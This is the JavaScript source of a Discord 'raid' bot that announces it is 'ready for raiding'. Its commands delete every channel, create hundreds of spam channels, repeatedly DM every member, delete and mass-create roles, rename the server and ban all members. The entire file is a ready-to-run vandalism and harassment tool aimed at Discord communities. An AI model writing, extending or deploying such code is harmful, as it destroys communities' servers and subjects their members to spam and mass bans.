const Discord = require("discord.js");
const client = new Discord.Client();
 
client.on("ready", () => {
  console.log(`Inizialating SSLManager...`);
  console.log(`Client ${client.user.tag} ready for raiding`);
  console.log("Bot created by SSLWasTaken | discord.gg/64bvyQxd3z");
  console.log(`Commands:
  .banall
  .nuke
  .raidconst
  .pfp
  .mdall
  .roles
  .deleterole
  .nick (name)
  .list`);
  presence();
});
 
function presence() {
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: "Whatever",
      type: "PLAYING"
    }
  });
}
 
//NUKE
 
client.on("message", message => {
  if (message.author.bot) return;
 
  if (message.content === ".nuke") {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels
      .create(`#BoostSDLG`, {
        type: "text"
      })
      .then(channel => {
        channel.send(
          "Whatever"
        );
      });
  }
});
 
//RAID
 
client.on("message", message => {
  if (message.author.bot) return;
 
  if (message.content === ".raid") {
    for (let i = 0; i <= 500; i++) {
      message.guild.channels
        .create(`RaidBySSL`, {
          type: "text"
        })
        .then(channel => {
          channel.send(
            "sex5 "
          );
          channel.send(
            "sex5  "
          );
          channel.send(
            "sex5  "
          );
          channel.send(
            "sex5  "
          );
          channel.send(
            "sex5  "
          );
          channel.send(
            "sex5  "
          );
          channel.send(
            "sex5  "
          );
        });
    }
  }
});
 
//MDALL
 
client.on("message", message => {
  if (message.author.bot) return;
 
  if (message.content === ".mdall")
    message.guild.members.cache.forEach(member => {
      setInterval(function() {
        member
          .send("Whatever")
          .catch(error => {});
      }, 450);
    });
});
 
//DELETE ROLES
 
client.on("message", message => {
  if (message.author.bot) return;
 
  if (message.content === ".deleterole") {
    message.guild.roles.cache.map(roles => roles.delete());
  }
});
 
//CREATE ROLES
 
client.on("message", message => {
  if (message.author.bot) return;
 
  if (message.content === ".roles") {
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({
        data: { name: `SSLOwns`, color: "#d41818" },
        reason: "razon"
      });
    }
  }
});
 
//SERVER NAME AND PFP CHANGER
 
client.on("message", message => {
  if (message.author.bot) return;
 
  if (message.content === ".pfp") {
    message.guild.setName("RaidBySSL");
    message.guild.setIcon(
      ""
    );
  }
});
 
//BANALL
 
client.on("message", message => {
  if (message.author.bot) return;
 
  if (message.content === ".banall") {
    message.delete();
    message.guild.members.cache.forEach(m => {
      m.ban();
    });
  }
});
 
//CHANGE NAMES
 
client.on("message", msg => {
  const args = msg.content
    .slice()
    .trim()
    .split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === ".nick") {
    msg.delete();
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member => {
      i++;
    });
    msg.channel.send(
      "> Changing names from **" + i + "** users to: **" + nickname + "**"
    );
    msg.guild.members.cache.forEach(member => {
      member.setNickname(nickname);
    });
  }
});
 
//SERVER LIST
 
client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content
    .slice()
    .trim()
    .split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === ".list") {
    message.delete();
    const embed = new Discord.MessageEmbed()
      .setTitle(message.guild.name)
      .setThumbnail()
      .setDescription(
        `**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`
      )
      .setColor("RED");
    message.channel.send(embed);
  }
});
 
client.login(" TOKEN BOT ");
